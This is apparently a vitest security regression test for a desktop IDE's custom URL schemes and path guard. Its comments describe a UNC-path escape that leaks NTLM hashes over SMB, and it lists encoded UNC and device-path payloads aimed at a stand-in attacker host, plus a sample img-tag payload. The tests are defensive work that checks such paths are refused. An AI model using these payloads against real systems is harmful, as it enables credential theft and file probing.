import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeEach, describe, expect, it, vi } from 'vitest';
import type { ArtifactStore } from '../../packages/store/src/index.js';

/**
 * Security round 2, SEC-32 (medium) and SEC-39 (low).
 *
 * SEC-32: `oide-artifact://<id>/<path>` and `oide-ext://<origin>/<path>` decode the URL path and
 * `realpathSync(resolve(dir, rel))` it before checking that it sits inside the folder. A path that
 * decodes to an absolute or UNC path (`/%5C%5Cattacker%5Cshare%5Cx.png`) makes main open
 * `\\attacker\share\x.png`: on Windows an outbound SMB connection that hands the user's NTLM hash
 * to the attacker, and a file-existence oracle anywhere on disk. An untrusted repo's design artifact
 * needs only `<img src="/%5C%5Cattacker%5Cx.png">` (`img-src 'self'`); the same works from any
 * extension panel and from a dev-server page inside the Browser preview panel.
 * Secure behaviour: refuse a path that is not lexically inside the folder before touching the disk.
 *
 * SEC-39: the `files.*` / `terminal.create` path guard realpaths the renderer's candidate (a UNC
 * path included) before comparing it with the roots. Secure behaviour: a UNC candidate under a
 * non-UNC root is refused without touching it.
 */
const seen = vi.hoisted(() => [] as string[]);
vi.mock('node:fs', async (orig) => {
  const fs = await orig<typeof import('node:fs')>();
  const record = (p: unknown) => void seen.push(String(p));
  const realpathSync = Object.assign(
    (p: import('node:fs').PathLike, o?: unknown) => (record(p), fs.realpathSync(p, o as never)),
    { native: (p: import('node:fs').PathLike, o?: unknown) => (record(p), fs.realpathSync.native(p, o as never)) },
  );
  const statSync = (p: import('node:fs').PathLike, o?: unknown) => (record(p), fs.statSync(p, o as never));
  const mod = { ...fs, realpathSync, statSync };
  return { ...mod, default: mod };
});

const { resolveArtifactUrl } = await import('../../apps/desktop/src/main/services/core.js');
const { extensionOrigin, resolveExtensionUrl } = await import('../../apps/desktop/src/main/services/extension-ui.js');
const { isInside } = await import('../../apps/desktop/src/main/security/paths.js');

const root = mkdtempSync(join(tmpdir(), 'oide-sec-r2-'));
const art = join(root, 'art');
const ext = join(root, 'ext');
mkdirSync(art, { recursive: true });
mkdirSync(join(ext, 'dist'), { recursive: true });
writeFileSync(join(art, 'index.html'), '<p>x</p>');
writeFileSync(join(ext, 'dist', 'panel.html'), '<p>x</p>');
afterAll(() => rmSync(root, { recursive: true, force: true }));

const store = { dirOf: () => art } as unknown as ArtifactStore;
const NAME = '@oide-test/r2';
const lookup = (o: string) => (o === extensionOrigin(NAME) ? { name: NAME, dir: ext, frameSrc: [] } : undefined);

/** Paths a crafted URL path decodes to: UNC shares, a drive root, a rooted path, Win32 device paths. */
const ESCAPES = [
  '%5C%5Cattacker.example%5Cshare%5Cx.png',
  '%5C%5C127.0.0.1%5Cc$%5Cx.png',
  '/%5C%5Cattacker.example%5Cshare%5Cx.png',
  '%5CWindows%5Cwin.ini',
  '%5C%5C%3F%5CUNC%5Cattacker.example%5Cshare%5Cx.png',
];
const touchedOutside = (dir: string) => seen.filter((p) => !p.toLowerCase().startsWith(dir.toLowerCase()) && !dir.toLowerCase().startsWith(p.toLowerCase()));

beforeEach(() => {
  seen.length = 0;
});

describe('SEC-32 preview and panel schemes never touch paths outside their folder', () => {
  it('still serves a normal file', () => {
    expect(resolveArtifactUrl(store, 'oide-artifact://a1/index.html')).not.toBeNull();
    expect(resolveExtensionUrl(lookup, `oide-ext://${extensionOrigin(NAME)}/dist/panel.html`)).not.toBeNull();
  });

  it('oide-artifact:// refuses absolute and UNC paths before any file system call', () => {
    for (const p of ESCAPES) {
      seen.length = 0;
      expect(resolveArtifactUrl(store, `oide-artifact://a1/${p}`), p).toBeNull();
      expect(touchedOutside(art), p).toEqual([]);
    }
  });

  it('oide-ext:// refuses absolute and UNC paths before any file system call', () => {
    for (const p of ESCAPES) {
      seen.length = 0;
      expect(resolveExtensionUrl(lookup, `oide-ext://${extensionOrigin(NAME)}/${p}`), p).toBeNull();
      expect(touchedOutside(ext), p).toEqual([]);
    }
  });
});

describe.skipIf(process.platform !== 'win32')('SEC-39 the renderer path guard does not open UNC paths', () => {
  it('refuses a UNC candidate under a local root without realpath-ing it', () => {
    expect(isInside(art, '\\\\attacker.example\\share\\x.txt')).toBe(false);
    expect(seen.filter((p) => p.startsWith('\\\\'))).toEqual([]);
  });
});
